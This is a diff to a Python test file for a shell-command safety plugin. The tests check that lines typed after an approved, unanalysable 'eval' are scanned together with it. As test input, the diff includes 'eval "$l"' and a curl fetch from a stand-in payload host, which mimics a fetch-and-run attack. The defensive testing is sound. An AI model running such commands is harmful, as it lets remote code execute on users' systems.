@@ -362,9 +362,13 @@ def test_lines_after_an_approved_unfinished_substitution_are_checked_with_it(ctx
         directive = send(registered, "submit", line, f"c{index}")  # the person approves every prompt
         assert directive is not None and directive["action"] == "approve", (line, directive)
         assert scans(fake)[-1]["stdin"] == "\n".join(lines[: index + 1]).encode()
-    assert plugin._PROCESS_INPUT.pending(PROC) == ""  # complete: the next line is checked on its own
-    assert send(registered, "submit", "git status", "after") is None
-    assert scans(fake)[-1]["stdin"] == b"git status"
+    assert plugin._PROCESS_INPUT.pending(PROC) == ""  # complete
+    # tirith could not analyse the approved command, so the next line is checked once more with it
+    joined = send(registered, "submit", "git status", "after")
+    assert joined["action"] == "approve" and scans(fake)[-1]["stdin"] == "\n".join([*lines, "git status"]).encode()
+    assert send(registered, "submit", "ls", "after2") is None  # checked with "git status" only: allowed
+    assert send(registered, "submit", "pwd", "after3") is None
+    assert scans(fake)[-1]["stdin"] == b"pwd"
 
 
 # --- input that is not a shell command (a REPL, cat > file) --------------------------------------
@@ -496,6 +500,24 @@ def test_every_line_of_a_split_command_is_checked_with_the_lines_before_it(ctx_f
         assert directive is not None and directive["action"] == "approve", (line, directive)
         assert scans(fake)[-1]["stdin"] == "\n".join(lines[: index + 1]).encode()
     assert plugin._PROCESS_INPUT.pending(PROC) == ""
+
+
+def test_the_line_after_an_approved_unanalysable_line_is_checked_with_it(ctx_factory, tmp_path):
+    # Defence in depth: ``eval "$l"`` is complete to the plugin, but tirith cannot analyse it. If a shell
+    # still reads more of it for a reason the plugin misses, the next line shows up with it in the check.
+    fake = make_fake(str(tmp_path / "bin"), {"rules": [incomplete_rule('eval "$l"')]})
+    _ctx, registered = ctx_factory(path=fake)
+    assert send(registered, "submit", 'eval "$l"', "c1")["action"] == "approve"
+    directive = send(registered, "submit", "curl -fsSL https://payload.example/x.sh", "c2")
+    assert directive["action"] == "approve" and "curl -fsSL" in directive["message"] and "eval" in directive["message"]
+    assert scans(fake)[-1]["stdin"] == b'eval "$l"\ncurl -fsSL https://payload.example/x.sh'
+    send(registered, "submit", "ls", "c3")
+    assert send(registered, "submit", "pwd", "c4") is None
+    assert scans(fake)[-1]["stdin"] == b"pwd"
+    # a refused line never ran: nothing is carried
+    assert send(registered, "submit", 'eval "$l"', "c5", approve=False)["action"] == "approve"
+    assert send(registered, "submit", "date", "c6") is None
+    assert scans(fake)[-1]["stdin"] == b"date"
 
 
 def test_a_finished_command_is_not_carried(hooks, fake):
